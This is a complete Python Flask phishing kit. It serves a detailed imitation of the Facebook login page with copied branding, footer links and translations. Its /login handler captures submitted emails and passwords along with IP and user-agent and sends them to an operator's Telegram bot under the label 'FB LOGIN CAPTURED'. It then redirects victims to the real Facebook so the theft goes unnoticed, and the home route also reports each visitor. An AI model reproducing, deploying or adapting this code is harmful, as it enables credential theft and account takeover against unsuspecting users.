import os
import requests
from flask import Flask, request, redirect

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "your_telegram_bot_token_here")
CHAT_ID = os.environ.get("CHAT_ID", "your_chat_id_here")

def send_telegram(msg):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={"chat_id": CHAT_ID, "text": msg})
    except:
        pass

HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – log in or sign up</title>
    <meta name="description" content="Log into Facebook to start sharing and connecting with your friends, family, and people you know.">
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico">
    <style>
        /* Global Reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* Facebook Light Theme Variables */
        :root {
            --bg: #f0f2f5;
            --card-bg: #ffffff;
            --text-primary: #1c1e21;
            --text-secondary: #65676b;
            --text-tertiary: #737373;
            --border: #dddfe2;
            --border-light: #e4e6eb;
            --blue: #1877f2;
            --blue-hover: #166fe5;
            --green: #42b72a;
            --green-hover: #36a420;
            --placeholder: #90949c;
            --shadow-sm: 0 1px 2px rgba(0,0,0,0.1);
            --shadow-md: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
            --shadow-lg: 0 4px 8px rgba(0,0,0,0.1), 0 16px 32px rgba(0,0,0,0.12);
            --ring: rgba(24,119,242,0.15);
        }

        /* Base Body */
        body {
            background: var(--bg);
            font-family: Helvetica, Arial, sans-serif;
            color: var(--text-primary);
            direction: ltr;
            line-height: 1.34;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 0 20px;
            -webkit-font-smoothing: antialiased;
            overflow-x: hidden;
        }

        /* Preloader Overlay */
        .preloader {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: var(--bg);
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: opacity 0.4s ease, visibility 0.4s ease;
        }
        .preloader.hidden {
            opacity: 0;
            visibility: hidden;
        }
        .preloader-spinner {
            width: 48px;
            height: 48px;
            border: 4px solid var(--border);
            border-top-color: var(--blue);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* Top Bar - Right Aligned Language Dropdown */
        .top-bar {
            width: 100%;
            max-width: 980px;
            display: flex;
            justify-content: flex-end;
            padding: 16px 0;
            position: relative;
            z-index: 10;
        }
        .language-select {
            background: var(--card-bg);
            color: var(--text-primary);
            border: 1px solid var(--border);
            border-radius: 6px;
            padding: 8px 32px 8px 12px;
            font-size: 14px;
            cursor: pointer;
            outline: none;
            transition: all 0.2s ease;
            font-family: Helvetica, Arial, sans-serif;
            appearance: none;
            -webkit-appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%2365676b' viewBox='0 0 16 16'%3E%3Cpath d='M4.646 6.146a.5.5 0 0 1 .708 0L8 8.793l2.646-2.647a.5.5 0 0 1 .708.708l-3 3a.5.5 0 0 1-.708 0l-3-3a.5.5 0 0 1 0-.708z'/%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 10px center;
        }
        .language-select:hover {
            border-color: var(--blue);
        }
        .language-select:focus {
            border-color: var(--blue);
            box-shadow: 0 0 0 3px var(--ring);
        }

        /* Main Content Wrapper */
        .main-container {
            width: 100%;
            max-width: 980px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 28px;
            position: relative;
            z-index: 1;
        }

        /* Brand Section */
        .brand-section {
            text-align: center;
            width: 100%;
        }
        .fb-logo {
            color: var(--blue);
            font-size: 52px;
            font-weight: bold;
            letter-spacing: -2px;
            margin-bottom: 8px;
        }
        .fb-tagline {
            font-size: 20px;
            font-weight: 400;
            line-height: 26px;
            color: var(--text-primary);
            max-width: 400px;
            margin: 0 auto;
        }

        /* Mobile App Download Badges */
        .mobile-app-links {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-top: 16px;
            flex-wrap: wrap;
        }
        .app-badge {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 8px 14px;
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            transition: all 0.2s ease;
            text-decoration: none;
            color: var(--text-primary);
        }
        .app-badge:hover {
            transform: translateY(-1px);
            box-shadow: var(--shadow-sm);
            border-color: var(--blue);
        }
        .app-icon {
            width: 20px;
            height: 20px;
            fill: currentColor;
        }
        .app-text {
            font-size: 12px;
            line-height: 1.2;
            text-align: left;
        }
        .app-text strong {
            display: block;
            font-size: 14px;
            font-weight: 600;
        }

        /* Login Card */
        .login-card {
            background: var(--card-bg);
            border-radius: 8px;
            box-shadow: var(--shadow-md);
            padding: 20px;
            width: 100%;
            max-width: 396px;
            transition: box-shadow 0.3s ease;
        }
        .login-card:hover {
            box-shadow: var(--shadow-lg);
        }

        /* Recent Login Avatars */
        .recent-logins {
            display: flex;
            justify-content: center;
            gap: 16px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .recent-account {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 6px;
            cursor: pointer;
            transition: all 0.2s ease;
        }
        .recent-account:hover .avatar-circle {
            border-color: var(--blue);
            transform: scale(1.05);
        }
        .avatar-circle {
            width: 56px;
            height: 56px;
            border-radius: 50%;
            background: #e4e6eb;
            border: 2px solid transparent;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: #65676b;
            overflow: hidden;
            transition: all 0.2s ease;
            font-weight: bold;
            text-transform: uppercase;
        }
        .avatar-circle.active {
            border-color: var(--blue);
            box-shadow: 0 0 0 3px var(--ring);
        }
        .avatar-name {
            font-size: 12px;
            color: var(--text-secondary);
            max-width: 80px;
            text-overflow: ellipsis;
            white-space: nowrap;
            overflow: hidden;
        }

        /* Not You Link */
        .not-you {
            text-align: center;
            margin-top: 8px;
            font-size: 13px;
            color: var(--text-secondary);
            display: none;
        }
        .not-you.show {
            display: block;
            animation: fadeIn 0.3s ease;
        }
        .not-you a {
            color: var(--blue);
            text-decoration: none;
            cursor: pointer;
            font-weight: 500;
        }
        .not-you a:hover {
            text-decoration: underline;
        }

        /* Input Fields */
        .input-wrap {
            position: relative;
            margin-bottom: 12px;
        }
        .input-field {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid var(--border);
            border-radius: 6px;
            font-size: 17px;
            outline: none;
            transition: all 0.2s ease;
            background: var(--card-bg);
            color: var(--text-primary);
            font-family: Helvetica, Arial, sans-serif;
        }
        .input-field::placeholder {
            color: var(--placeholder);
        }
        .input-field:focus {
            border-color: var(--blue);
            box-shadow: 0 0 0 2px var(--ring);
        }
        .input-field.error {
            border-color: #f02849;
            box-shadow: 0 0 0 2px rgba(240,40,73,0.15);
        }

        /* Password Eye Toggle */
        .toggle-eye {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            padding: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--text-secondary);
            outline: none;
            border-radius: 50%;
            transition: all 0.2s ease;
        }
        .toggle-eye:hover {
            color: var(--blue);
            background: var(--ring);
        }
        .toggle-eye:active {
            transform: translateY(-50%) scale(0.92);
        }
        .toggle-eye svg {
            width: 20px;
            height: 20px;
        }

        /* Login Button */
        .login-btn {
            width: 100%;
            background: var(--blue);
            color: #fff;
            border: none;
            padding: 12px 16px;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s ease;
            line-height: 1.2;
            position: relative;
            overflow: hidden;
            font-family: Helvetica, Arial, sans-serif;
        }
        .login-btn:hover {
            background: var(--blue-hover);
        }
        .login-btn:active {
            transform: scale(0.98);
        }
        .login-btn.loading {
            pointer-events: none;
            background: var(--blue);
        }
        .login-btn.loading::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 22px;
            height: 22px;
            margin: -11px 0 0 -11px;
            border: 3px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
        }

        /* Forgot Password Link */
        .forgot-link {
            display: block;
            text-align: center;
            margin-top: 16px;
            color: var(--blue);
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .forgot-link:hover {
            text-decoration: underline;
        }

        /* Divider */
        .divider {
            border-bottom: 1px solid var(--border-light);
            margin: 18px 0;
            width: 100%;
        }

        /* Create Account Button */
        .create-btn {
            display: block;
            width: auto;
            margin: 0 auto;
            background: var(--green);
            color: #fff;
            border: none;
            padding: 12px 20px;
            border-radius: 6px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s ease;
            font-family: Helvetica, Arial, sans-serif;
            text-decoration: none;
            text-align: center;
        }
        .create-btn:hover {
            background: var(--green-hover);
        }
        .create-btn:active {
            transform: scale(0.98);
        }

        /* Create a Page Text */
        .create-page-text {
            text-align: center;
            margin-top: 24px;
            font-size: 14px;
            color: var(--text-primary);
        }
        .create-page-text a {
            color: var(--text-primary);
            text-decoration: none;
            font-weight: bold;
        }
        .create-page-text a:hover {
            text-decoration: underline;
        }

        /* Footer */
        .footer {
            margin-top: 40px;
            width: 100%;
            max-width: 980px;
            padding: 20px 0;
            border-top: 1px solid var(--border);
            text-align: center;
            position: relative;
            z-index: 1;
        }
        .footer-categories {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 16px 20px;
            text-align: left;
            margin-bottom: 20px;
        }
        .footer-category h4 {
            font-size: 13px;
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 8px;
        }
        .footer-category ul {
            list-style: none;
        }
        .footer-category li {
            margin-bottom: 4px;
        }
        .footer-category a {
            color: var(--text-secondary);
            text-decoration: none;
            font-size: 12px;
        }
        .footer-category a:hover {
            text-decoration: underline;
        }
        .footer-links {
            list-style: none;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 8px 16px;
            font-size: 12px;
            color: var(--text-secondary);
            padding: 0;
        }
        .footer-links li {
            display: inline;
        }
        .footer-links a {
            color: var(--text-secondary);
            text-decoration: none;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .footer-copy {
            margin-top: 15px;
            font-size: 11px;
            color: var(--text-tertiary);
        }

        /* Desktop Layout */
        @media (min-width: 900px) {
            .main-container {
                flex-direction: row;
                justify-content: space-between;
                align-items: center;
                min-height: 55vh;
                gap: 40px;
            }
            .brand-section {
                text-align: left;
                flex: 1;
                padding-right: 40px;
            }
            .fb-logo {
                font-size: 60px;
            }
            .fb-tagline {
                font-size: 24px;
                line-height: 30px;
                margin: 0;
            }
            .login-card {
                flex: 1;
                max-width: 396px;
            }
        }

        /* Mobile Layout */
        @media (max-width: 480px) {
            .top-bar {
                justify-content: flex-end;
                padding: 12px 0;
            }
            .fb-logo {
                font-size: 40px;
            }
            .fb-tagline {
                font-size: 17px;
                line-height: 22px;
            }
            .login-card {
                padding: 16px;
            }
            .input-field {
                font-size: 15px;
                padding: 13px 14px;
            }
            .login-btn {
                font-size: 17px;
                padding: 11px;
            }
            .create-btn {
                font-size: 15px;
                padding: 10px 16px;
            }
            .footer-categories {
                grid-template-columns: repeat(2, 1fr);
            }
            .avatar-circle {
                width: 48px;
                height: 48px;
                font-size: 20px;
            }
        }

        /* Shake Animation */
        @keyframes shake {
            0%, 100% {
                transform: translateX(0);
            }
            20% {
                transform: translateX(-8px);
            }
            40% {
                transform: translateX(8px);
            }
            60% {
                transform: translateX(-5px);
            }
            80% {
                transform: translateX(5px);
            }
        }
        .shake {
            animation: shake 0.4s ease;
        }

        /* Fade In Animation */
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        .fade-in {
            animation: fadeIn 0.4s ease-out;
        }
    </style>
</head>
<body>
    <!-- Preloader -->
    <div class="preloader" id="preloader">
        <div class="preloader-spinner"></div>
    </div>

    <!-- Top Bar - Right Aligned Language Dropdown -->
    <div class="top-bar">
        <select class="language-select" id="languageSelect" onchange="changeLanguage()">
            <option value="en">English (US)</option>
            <option value="fil">Filipino</option>
            <option value="bis">Bisaya</option>
            <option value="es">Español</option>
            <option value="ja">日本語</option>
            <option value="ko">한국어</option>
            <option value="zh">中文(简体)</option>
            <option value="ar">العربية</option>
            <option value="pt">Português (Brasil)</option>
            <option value="fr">Français (France)</option>
            <option value="de">Deutsch</option>
        </select>
    </div>

    <!-- Main Content -->
    <div class="main-container">
        <!-- Brand Section -->
        <div class="brand-section fade-in">
            <div class="fb-logo">facebook</div>
            <div class="fb-tagline" id="tagline">Connect with friends and the world around you on Facebook.</div>
            <div class="mobile-app-links">
                <!-- Real App Store Link -->
                <a href="https://apps.apple.com/app/facebook/id284882215" target="_blank" class="app-badge">
                    <svg class="app-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/></svg>
                    <span class="app-text"><strong>App Store</strong>Download</span>
                </a>
                <!-- Real Google Play Link -->
                <a href="https://play.google.com/store/apps/details?id=com.facebook.katana" target="_blank" class="app-badge">
                    <svg class="app-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M3.6 1.8L13.2 12 3.6 22.2c-.4-.3-.6-.8-.6-1.4V3.2c0-.6.2-1.1.6-1.4zm10.8 8.1L5.4 1.8c.3-.2.7-.3 1.1-.3.5 0 1.1.2 1.6.5l7.2 4.2-.9.7zm0 4.2l.9.7-7.2 4.2c-.5.3-1.1.5-1.6.5-.4 0-.8-.1-1.1-.3l9-5.1zm5.4-3.6l2.1 1.2c.6.4.9 1 .9 1.7 0 .6-.3 1.2-.9 1.6l-2.1 1.2-3.3-1.9L13.2 12l3.3-1.9 3.3-1.6z"/></svg>
                    <span class="app-text"><strong>Google Play</strong>Download</span>
                </a>
            </div>
        </div>

        <!-- Login Card -->
        <div class="login-card fade-in" style="animation-delay:0.1s;">
            <div class="recent-logins" id="recentLogins"></div>
            <div class="not-you" id="notYou"><span id="notYouText">Not you?</span> <a onclick="clearAccount()" id="switchAccountLink">Switch account</a></div>
            <form id="loginForm" action="/login" method="post">
                <div class="input-wrap">
                    <input class="input-field" type="text" name="email" id="email" placeholder="Email or phone number" required autofocus autocomplete="username">
                </div>
                <div class="input-wrap">
                    <input class="input-field" type="password" name="pass" id="pass" placeholder="Password" required autocomplete="current-password">
                    <button class="toggle-eye" type="button" onclick="togglePass()" aria-label="Show password">
                        <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z" />
                            <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                        </svg>
                    </button>
                </div>
                <button class="login-btn" type="submit" id="loginBtn">Log In</button>
            </form>
            <!-- Real Forgot Password Link -->
            <a href="https://www.facebook.com/login/identify/" target="_blank" class="forgot-link" id="forgotLink">Forgot password?</a>
            <div class="divider"></div>
            <!-- Real Create Account Link -->
            <a href="https://www.facebook.com/reg/" target="_blank" class="create-btn" id="createAccountBtn">Create new account</a>
        </div>
    </div>

    <!-- Create a Page -->
    <div class="create-page-text fade-in" style="animation-delay:0.2s;">
        <a href="https://www.facebook.com/pages/create/" target="_blank" id="createPageLink">Create a Page</a> <span id="createPageText">for a celebrity, brand or business.</span>
    </div>

    <!-- Footer -->
    <footer class="footer fade-in" style="animation-delay:0.3s;">
        <div class="footer-categories">
            <div class="footer-category">
                <h4 id="footerProduct">Product</h4>
                <ul>
                    <li><a href="https://www.facebook.com/features" target="_blank">Features</a></li>
                    <li><a href="https://www.messenger.com/" target="_blank">Messenger</a></li>
                    <li><a href="https://www.facebook.com/lite" target="_blank">Facebook Lite</a></li>
                    <li><a href="https://www.facebook.com/watch" target="_blank">Video</a></li>
                    <li><a href="https://www.facebook.com/marketplace" target="_blank">Marketplace</a></li>
                    <li><a href="https://pay.facebook.com/" target="_blank">Meta Pay</a></li>
                </ul>
            </div>
            <div class="footer-category">
                <h4 id="footerCompany">Company</h4>
                <ul>
                    <li><a href="https://about.facebook.com/" target="_blank">About</a></li>
                    <li><a href="https://www.metacareers.com/" target="_blank">Careers</a></li>
                    <li><a href="https://developers.facebook.com/" target="_blank">Developers</a></li>
                    <li><a href="https://www.meta.ai/" target="_blank">Meta AI</a></li>
                    <li><a href="https://www.meta.com/shop/" target="_blank">Meta Store</a></li>
                    <li><a href="https://www.meta.com/quest/" target="_blank">Meta Quest</a></li>
                </ul>
            </div>
            <div class="footer-category">
                <h4 id="footerLegal">Legal</h4>
                <ul>
                    <li><a href="https://www.facebook.com/privacy/policy/" target="_blank">Privacy Policy</a></li>
                    <li><a href="https://www.facebook.com/privacy/center/" target="_blank">Privacy Center</a></li>
                    <li><a href="https://www.facebook.com/terms.php" target="_blank">Terms</a></li>
                    <li><a href="https://www.facebook.com/policies/cookies/" target="_blank">Cookies</a></li>
                    <li><a href="https://www.facebook.com/adchoices" target="_blank">Ad choices</a></li>
                </ul>
            </div>
            <div class="footer-category">
                <h4 id="footerSupport">Support</h4>
                <ul>
                    <li><a href="https://www.facebook.com/help/" target="_blank">Help</a></li>
                    <li><a href="https://www.facebook.com/fundraisers/" target="_blank">Fundraisers</a></li>
                    <li><a href="https://www.facebook.com/business/services" target="_blank">Services</a></li>
                    <li><a href="https://www.facebook.com/votinginformationcenter" target="_blank">Voting Info</a></li>
                </ul>
            </div>
        </div>
        <ul class="footer-links">
            <li><a href="#">English (US)</a></li>
            <li><a href="#">Filipino</a></li>
            <li><a href="#">Bisaya</a></li>
            <li><a href="#">Español</a></li>
            <li><a href="#">日本語</a></li>
            <li><a href="#">한국어</a></li>
            <li><a href="#">中文(简体)</a></li>
            <li><a href="#">العربية</a></li>
            <li><a href="#">Português (Brasil)</a></li>
            <li><a href="#">Français (France)</a></li>
            <li><a href="#">Deutsch</a></li>
        </ul>
        <div class="footer-copy">Meta © 2026</div>
    </footer>

    <script>
        // Language translations
        const translations = {
            en: {
                tagline: 'Connect with friends and the world around you on Facebook.',
                emailPlaceholder: 'Email or phone number',
                passwordPlaceholder: 'Password',
                loginBtn: 'Log In',
                forgotLink: 'Forgot password?',
                createAccountBtn: 'Create new account',
                createPageLink: 'Create a Page',
                createPageText: 'for a celebrity, brand or business.',
                notYouText: 'Not you?',
                switchAccountLink: 'Switch account',
                footerProduct: 'Product',
                footerCompany: 'Company',
                footerLegal: 'Legal',
                footerSupport: 'Support'
            },
            fil: {
                tagline: 'Kumonekta sa mga kaibigan at sa mundo sa paligid mo sa Facebook.',
                emailPlaceholder: 'Email o numero ng telepono',
                passwordPlaceholder: 'Password',
                loginBtn: 'Mag-log In',
                forgotLink: 'Nakalimutan ang password?',
                createAccountBtn: 'Gumawa ng bagong account',
                createPageLink: 'Gumawa ng Page',
                createPageText: 'para sa celebrity, brand o negosyo.',
                notYouText: 'Hindi ikaw?',
                switchAccountLink: 'Magpalit ng account',
                footerProduct: 'Produkto',
                footerCompany: 'Kumpanya',
                footerLegal: 'Legal',
                footerSupport: 'Suporta'
            },
            es: {
                tagline: 'Conéctate con amigos y el mundo que te rodea en Facebook.',
                emailPlaceholder: 'Correo electrónico o número de teléfono',
                passwordPlaceholder: 'Contraseña',
                loginBtn: 'Iniciar sesión',
                forgotLink: '¿Olvidaste tu contraseña?',
                createAccountBtn: 'Crear cuenta nueva',
                createPageLink: 'Crear una página',
                createPageText: 'para una celebridad, marca o negocio.',
                notYouText: '¿No eres tú?',
                switchAccountLink: 'Cambiar de cuenta',
                footerProduct: 'Producto',
                footerCompany: 'Compañía',
                footerLegal: 'Legal',
                footerSupport: 'Soporte'
            }
        };

        function changeLanguage() {
            const lang = document.getElementById('languageSelect').value;
            const t = translations[lang] || translations.en;

            document.getElementById('tagline').textContent = t.tagline;
            document.getElementById('email').placeholder = t.emailPlaceholder;
            document.getElementById('pass').placeholder = t.passwordPlaceholder;
            document.getElementById('loginBtn').textContent = t.loginBtn;
            document.getElementById('forgotLink').textContent = t.forgotLink;
            document.getElementById('createAccountBtn').textContent = t.createAccountBtn;
            document.getElementById('createPageLink').textContent = t.createPageLink;
            document.getElementById('createPageText').textContent = t.createPageText;
            document.getElementById('notYouText').textContent = t.notYouText;
            document.getElementById('switchAccountLink').textContent = t.switchAccountLink;
            document.getElementById('footerProduct').textContent = t.footerProduct;
            document.getElementById('footerCompany').textContent = t.footerCompany;
            document.getElementById('footerLegal').textContent = t.footerLegal;
            document.getElementById('footerSupport').textContent = t.footerSupport;
        }

        // Preloader - Hide after page load
        window.addEventListener('load', function() {
            setTimeout(function() {
                document.getElementById('preloader').classList.add('hidden');
            }, 600);
        });

        // Load Recent Accounts from localStorage
        function loadRecentAccounts() {
            const container = document.getElementById('recentLogins');
            const stored = localStorage.getItem('fb_recent_accounts');
            const accounts = stored ? JSON.parse(stored) : [];
            container.innerHTML = '';
            if (accounts.length === 0) {
                for (let i = 0; i < 3; i++) {
                    const div = document.createElement('div');
                    div.className = 'recent-account';
                    div.innerHTML = `
                        <div class="avatar-circle" onclick="selectFakeAvatar(this)">👤</div>
                        <div class="avatar-name">Account</div>
                    `;
                    container.appendChild(div);
                }
            } else {
                accounts.forEach(acc => {
                    const div = document.createElement('div');
                    div.className = 'recent-account';
                    const initial = acc.email.charAt(0).toUpperCase();
                    div.innerHTML = `
                        <div class="avatar-circle" data-email="${acc.email}" onclick="selectAccount(this)">${initial}</div>
                        <div class="avatar-name">${acc.email}</div>
                    `;
                    container.appendChild(div);
                });
            }
        }

        // Select an existing account
        function selectAccount(el) {
            document.querySelectorAll('.avatar-circle').forEach(a => a.classList.remove('active'));
            el.classList.add('active');
            document.getElementById('email').value = el.dataset.email;
            document.getElementById('notYou').classList.add('show');
            document.getElementById('pass').focus();
        }

        // Select a generic avatar (visual only)
        function selectFakeAvatar(el) {
            document.querySelectorAll('.avatar-circle').forEach(a => a.classList.remove('active'));
            el.classList.add('active');
        }

        // Clear selected account
        function clearAccount() {
            document.querySelectorAll('.avatar-circle').forEach(a => a.classList.remove('active'));
            document.getElementById('email').value = '';
            document.getElementById('notYou').classList.remove('show');
            document.getElementById('email').focus();
        }

        // Form submission - Save account and show loading
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value.trim();
            if (email) {
                let stored = localStorage.getItem('fb_recent_accounts');
                let accounts = stored ? JSON.parse(stored) : [];
                if (!accounts.find(a => a.email === email)) {
                    accounts.unshift({ email: email });
                    accounts = accounts.slice(0, 3);
                    localStorage.setItem('fb_recent_accounts', JSON.stringify(accounts));
                }
            }
            var btn = document.getElementById('loginBtn');
            btn.classList.add('loading');
            btn.textContent = '';
            setTimeout(function() {
                e.target.submit();
            }, 800);
        });

        // Password visibility toggle
        function togglePass() {
            var pass = document.getElementById('pass');
            var eye = document.getElementById('eyeIcon');
            if (pass.type === 'password') {
                pass.type = 'text';
                eye.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.45 10.45 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.498a10.523 10.523 0 01-4.293 5.774M6.228 6.228L3 3m3.228 3.228l3.65 3.65m7.894 7.894L21 21m-3.228-3.228l-3.65-3.65m0 0a3 3 0 10-4.243-4.243m4.242 4.242L9.88 9.88" />';
            } else {
                pass.type = 'password';
                eye.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z" /><path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />';
            }
        }

        // Initialize
        loadRecentAccounts();
    </script>
</body>
</html>
"""

@app.route("/")
def home():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent")
    send_telegram(f"👁 Visitor:\nIP: {ip}\nUA: {ua}")
    return HTML_PAGE

@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email", "N/A")
    password = request.form.get("pass", "N/A")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent")
    send_telegram(
        f"🔑 FB LOGIN CAPTURED:\n"
        f"Email/Phone: {email}\n"
        f"Password: {password}\n"
        f"IP: {ip}\n"
        f"User-Agent: {ua}"
    )
    return redirect("https://www.facebook.com/login.php")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))